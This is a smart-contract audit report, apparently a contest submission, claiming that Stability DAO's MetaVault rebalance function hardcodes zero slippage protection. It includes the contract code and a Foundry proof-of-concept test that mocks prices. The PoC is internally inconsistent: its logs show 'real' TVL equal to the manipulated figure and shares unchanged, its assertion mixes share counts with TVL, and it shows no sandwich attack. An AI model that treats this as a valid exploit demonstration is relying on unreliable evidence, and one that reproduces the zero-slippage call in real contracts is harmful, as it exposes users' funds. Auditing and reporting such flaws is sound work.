## Stability DAO
[Contest Details] (https://cantina.xyz/code/e1c0be8d-0c3d-485a-a446-a582beb120b1/findings?created_by=deeney&finding=30)

### [Medium-01] Hardcoded zero slippage protection in MetaVault rebalance

**Summary**
The rebalance function hardcodes the minSharesOut parameter to 0 when calling depositAssets() on underlying vaults. This completely disables slippage protection, making rebalancing operations vulnerable to sandwich attacks and price manipulation. That hardcoded 0 means "accept any amount of shares, even if worthless."


**Finding Description**
```javascript
function rebalance(
        uint[] memory withdrawShares,
        uint[] memory depositAmountsProportions
    ) external onlyAllowedOperator returns (uint[] memory proportions, int cost) {
        _checkProportions(depositAmountsProportions);

        MetaVaultStorage storage $ = _getMetaVaultStorage();
        uint len = $.vaults.length;
        require(
            len == withdrawShares.length && len == depositAmountsProportions.length,
            IControllable.IncorrectArrayLength()
        );

        (uint tvlBefore,) = tvl();

        if (CommonLib.eq($._type, VaultTypeLib.MULTIVAULT)) {
            address[] memory _assets = $.assets.values();
            for (uint i; i < len; ++i) {
                if (withdrawShares[i] != 0) {
                    IStabilityVault($.vaults[i]).withdrawAssets(_assets, withdrawShares[i], new uint[](1));
                    require(depositAmountsProportions[i] == 0, IncorrectRebalanceArgs());
                }
            }
            uint totalToDeposit = IERC20(_assets[0]).balanceOf(address(this));
            for (uint i; i < len; ++i) {
                address vault = $.vaults[i];
                uint[] memory amountsMax = new uint[](1);
                amountsMax[0] = depositAmountsProportions[i] * totalToDeposit / 1e18;
                if (amountsMax[0] != 0) {
                    IERC20(_assets[0]).forceApprove(vault, amountsMax[0]);
 @>                   IStabilityVault(vault).depositAssets(_assets, amountsMax, 0, address(this));
                    require(withdrawShares[i] == 0, IncorrectRebalanceArgs());
                }
            }
        } else {
            revert NotSupported();
        }

        (uint tvlAfter,) = tvl();
        cost = int(tvlBefore) - int(tvlAfter);
        proportions = currentProportions();
        emit Rebalance(withdrawShares, depositAmountsProportions, cost);
    }
```

**Proof of Concept**
```javascript
function test_RebalanceSlippage() public {
        IMetaVault metaVault = IMetaVault(metaVaults[0]);
        address[] memory vaults = metaVault.vaults();
        address targetVault = vaults[0]; // First vault to rebalance
        address priceReader = IPlatform(PLATFORM).priceReader();
        address targetAsset = IStabilityVault(targetVault).assets()[0];

        // 1. Initial Deposit to set up TVL
        address[] memory assets = metaVault.assetsForDeposit();
        uint256[] memory depositAmounts = _getAmountsForDeposit(1000000, assets); //$1M deposits
        _dealAndApprove(address(this), address(metaVault), assets, depositAmounts);
        metaVault.depositAssets(assets, depositAmounts, 0, address(this));

        // 2. store initial TVL using real prices
        (uint initialTvl,) = metaVault.tvl();
        uint initialVaultShares = IERC20(targetVault).balanceOf(address(metaVault));

         // 3. Manipulate price reporting through multiple layers
        // Mock vault price reporting
        vm.mockCall(
            targetVault,
            abi.encodeWithSelector(IStabilityVault.price.selector),
            abi.encode(2e18, false) // Double reported price
        );
        vm.mockCall(
            priceReader,
            abi.encodeWithSelector(IPriceReader.getPrice.selector, targetAsset),
            abi.encode(2e18, true) // Double reported price
        );

        // 4. Prepare rebalance parameters
        uint[] memory withdrawShares = new uint[](vaults.length);
        uint[] memory depositProportions = new uint[](vaults.length);

        // setup rebalance to move funds to manipulated vault
        depositProportions[0] = 1e18; // 100% to first vault
        for(uint i = 1; i < vaults.length; i++) {
            withdrawShares[i] = IERC20(vaults[i]).balanceOf(address(metaVault));
        }

        // execute rebalance
        vm.startPrank(multisig);
        metaVault.rebalance(withdrawShares, depositProportions);
        vm.stopPrank();


        // 6. Verify attack results using dual perspective
        (uint reportedTvl,) = metaVault.tvl(); // Uses manipulated prices
        uint realTvl = calculateRealTvl(metaVault); // Independent calculation
        uint postRebalanceShares = IERC20(targetVault).balanceOf(address(metaVault));


        console.log("Initial TVL:", initialTvl);
        console.log("Reported TVL (manipulated):", reportedTvl);
        console.log("Real TVL (actual):", realTvl);
        console.log("Vault shares change:", initialVaultShares, "->", postRebalanceShares);

        // Critical assertions
        assertGt(reportedTvl, initialTvl, "Reported TVL should increase with fake prices");
        assertLt(
            postRebalanceShares, 
            (initialTvl * 2 * 1e18) / 1e18, // Expected if price doubling was real
            "Share count doesn't reflect real value"
        );

    }
Logs:
  Initial TVL: 999999999999874999641391
  Reported TVL (manipulated): 1940313544842244434257092
  Real TVL (actual): 1940313544842244434257092
  Vault shares change: 970156772421122217128546 -> 970156772421122217128546
```
**Recommended Mitigation**
Add slippage protection